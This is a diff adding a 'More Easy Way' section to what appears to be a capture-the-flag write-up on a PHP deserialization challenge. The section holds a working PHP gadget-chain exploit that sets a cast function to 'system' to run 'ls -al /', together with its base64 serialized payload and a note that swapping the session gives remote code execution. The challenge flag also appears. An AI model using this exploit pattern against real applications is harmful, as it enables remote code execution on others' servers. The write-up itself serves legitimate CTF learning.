@@ -135,6 +135,36 @@ This is your 🐱:
 
 Flag: `FLAG{magic_cat_pwnpwn}`
 
+### More Easy Way
+```php
+<?php
+class Caster
+{
+    public $cast_func = "system";
+}
+
+
+class Cat
+{
+    public $magic;
+    public $spell;
+    function __construct()
+    {
+        $this->spell = 'ls -al /';
+        $this->magic = new Caster();
+    }
+}
+
+echo base64_encode(serialize(new Cat()));
+```
+
+```bash
+$ php -f exp.php
+TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjg6ImxzIC1hbCAvIjt9
+```
+
+替換session就拿到RCE了
+
 ## Reference
 * [PHP物件導向的第一課：class ](https://ithelp.ithome.com.tw/articles/10114633)
 * [【第十九天 - PHP反序列化(1)】](https://ithelp.ithome.com.tw/articles/10277044)
